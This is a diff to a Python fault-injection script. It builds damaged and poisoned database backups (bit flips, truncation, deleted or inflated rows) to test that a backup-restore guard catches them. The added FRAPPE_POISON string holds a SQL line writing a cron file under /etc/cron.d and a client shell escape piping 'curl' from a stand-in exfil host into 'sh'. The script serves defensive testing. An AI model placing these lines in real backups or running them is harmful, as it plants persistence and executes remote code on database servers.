@@ -9,18 +9,23 @@ the re-signed copies show the deeper checks catching it anyway. The poisoned
 copy is built so its payload stays quiet in the builder (it fires only outside
 a database named "build", on the first customers row loaded), the way a real one would hide from a dry run.
 
-  python faults.py <good backup.dump> [--out DIR] [--make-only]
+  python faults.py <good backup.dump | good Frappe backup.sql.gz> [--out DIR] [--make-only]
 
 Without --make-only every fault runs through guard.run_cell on every app
-version and a table shows what caught it; exit 1 if any fault slipped through.
+version (frappe_target.run_cell for a Frappe backup; none of its faults gets
+past the sandbox, so none reaches test.local) and a table shows what caught
+it; exit 1 if any fault slipped through.
 """
 import argparse
 import asyncio
+import gzip
 import json
+import re
 import shutil
 import sys
 from pathlib import Path
 
+import frappe_target
 import guard
 
 HERE = Path(__file__).resolve().parent
@@ -42,6 +47,17 @@ FAULTS = {
     "schema-v2": ("migration 002 applied, honest v2 manifest", "drift caught, DR ready"),
     "poisoned": ("a CHECK constraint calls a function that runs a shell command", "quarantined"),
 }
+FRAPPE_POISON = ("SELECT 'x' INTO OUTFILE '/etc/cron.d/rg-persist';\n"
+                 "\\! curl -s http://exfil.nordvik-backup.net/k | sh\n")
+FRAPPE_FAULTS = {
+    "bitflip-stale": ("16 bytes of the .sql.gz flipped at 3 offsets, manifest untouched", "not restorable"),
+    "bitflip": ("16 bytes of the .sql.gz flipped at 3 offsets, manifest re-signed", "not restorable"),
+    "truncated": (".sql.gz cut at 60 %, manifest re-signed", "not restorable"),
+    "truncated-sql": ("SQL cut at 60 % and gzipped cleanly, manifest re-signed", "not restorable"),
+    "rows-deleted": ("all Demo Service Request rows deleted, manifest re-signed", "not restorable"),
+    "rule-broken": ("total_cost of every Demo Service Request x10, manifest re-signed", "not restorable"),
+    "poisoned": ("INTO OUTFILE into /etc/cron.d and a client shell escape", "quarantined"),
+}
 
 
 def _flip(data):
@@ -52,14 +68,49 @@ def _flip(data):
     return bytes(data)
 
 
-def _write(out, stem, data, manifest, resign=True):
-    dump = out / f"{stem}.dump"
+def _write(out, stem, data, manifest, resign=True, ext=".dump"):
+    dump = out / f"{stem}{ext}"
     dump.write_bytes(data)
     m = dict(manifest, file=dump.name)
     if resign:
         m["sha256"] = guard.sha256_file(dump)
-    dump.with_suffix(".json").write_text(json.dumps(m))
+    (out / f"{stem}.json").write_text(json.dumps(m))
     return dump
+
+
+def _scale_column(sql, table, column, factor):
+    """Multiply one numeric column of every row in a mysqldump INSERT block of `table`."""
+    create = re.search(rf"CREATE TABLE `{re.escape(table)}` \((.*?)\n\)", sql, re.S)[1]
+    at = re.findall(r"^  `(\w+)`", create, re.M).index(column)
+    value = re.compile(r"'(?:[^'\\]|\\.)*'|NULL|-?[\d.]+")
+
+    def row(m):
+        vals = value.findall(m[1])
+        vals[at] = repr(float(vals[at]) * factor)
+        return f"({','.join(vals)}){m[2]}"
+    head = f"INSERT INTO `{table}` VALUES\n"
+    start = sql.index(head) + len(head)
+    end = sql.index(";\n", start) + 2
+    return sql[:start] + re.sub(r"^\((.*)\)([,;])$", row, sql[start:end], flags=re.M) + sql[end:]
+
+
+def make_frappe(src, out):
+    backup = frappe_target.load_backup(src)
+    m, base = backup["manifest"], backup["id"][:-len("-database")]
+    raw = Path(src).read_bytes()
+    sql = gzip.decompress(raw).decode()
+    table = f"tab{frappe_target.config()['doctype']}"
+    insert = re.compile(rf"^INSERT INTO `{re.escape(table)}` VALUES\n.*?;\n", re.M | re.S)
+    header_end = sql.index("\n\n", sql.index("enable the sandbox mode")) + 2
+    out.mkdir(parents=True, exist_ok=True)
+    w = lambda fault, data, resign=True: _write(out, f"{base}-{fault}-database", data, m, resign, ext=".sql.gz")
+    return {"bitflip-stale": w("bitflip-stale", _flip(raw), resign=False),
+            "bitflip": w("bitflip", _flip(raw)),
+            "truncated": w("truncated", raw[:int(len(raw) * 0.6)]),
+            "truncated-sql": w("truncated-sql", gzip.compress(sql[:int(len(sql) * 0.6)].encode())),
+            "rows-deleted": w("rows-deleted", gzip.compress(insert.sub("", sql, count=1).encode())),
+            "rule-broken": w("rule-broken", gzip.compress(_scale_column(sql, table, "total_cost", 10).encode())),
+            "poisoned": w("poisoned", gzip.compress((sql[:header_end] + FRAPPE_POISON + sql[header_end:]).encode()))}
 
 
 async def _rebuild(backup, sql, recount):
@@ -130,13 +181,13 @@ def _caught_by(cells):
     return "-"
 
 
-async def run(made):
+async def run(made, kind=guard, targets=None, faults=FAULTS):
     rows = []
     for fault, dump in made.items():
-        backup = guard.load_backup(dump)
-        cells = [await guard.run_cell(backup, a) for a in guard.apps()]
+        backup = kind.load_backup(dump)
+        cells = [await kind.run_cell(backup, a) for a in targets or guard.apps()]
         ok = _verdict(fault, cells)
-        rows.append((fault, FAULTS[fault][1], " / ".join(f"{c['app_version']} {c['state']}" for c in cells),
+        rows.append((fault, faults[fault][1], " / ".join(f"{c['app_version']} {c['state']}" for c in cells),
                      _caught_by(cells), "PASS" if ok else "MISSED", cells[0]["reason"]))
         print(f"{fault}: {rows[-1][4]}", file=sys.stderr)
     widths = [max(len(r[i]) for r in rows + [("fault", "must", "result per app", "caught by", "test", "")])
@@ -153,16 +204,20 @@ async def run(made):
 def main():
     p = argparse.ArgumentParser(description=__doc__.split("\n")[0])
     p.add_argument("backup")
-    p.add_argument("--out", default=str(HERE / "faults" / "out"))
+    p.add_argument("--out")
     p.add_argument("--make-only", action="store_true")
     a = p.parse_args()
-    out = Path(a.out)
-    if out.resolve() == (HERE / "faults" / "out").resolve() and out.exists():
+    frappe = a.backup.endswith(".sql.gz")
+    default = HERE / "faults" / ("out-frappe" if frappe else "out")
+    out = Path(a.out or default)
+    if out.resolve() == default.resolve() and out.exists():
         shutil.rmtree(out)
-    made = asyncio.run(make(a.backup, out))
+    made = make_frappe(a.backup, out) if frappe else asyncio.run(make(a.backup, out))
     print("made:", ", ".join(d.name for d in made.values()), file=sys.stderr)
     if not a.make_only:
-        sys.exit(0 if asyncio.run(run(made)) else 1)
+        ran = (run(made, frappe_target, [frappe_target.target(frappe_target.config())], FRAPPE_FAULTS) if frappe
+               else run(made))
+        sys.exit(0 if asyncio.run(ran) else 1)
 
 
 if __name__ == "__main__":
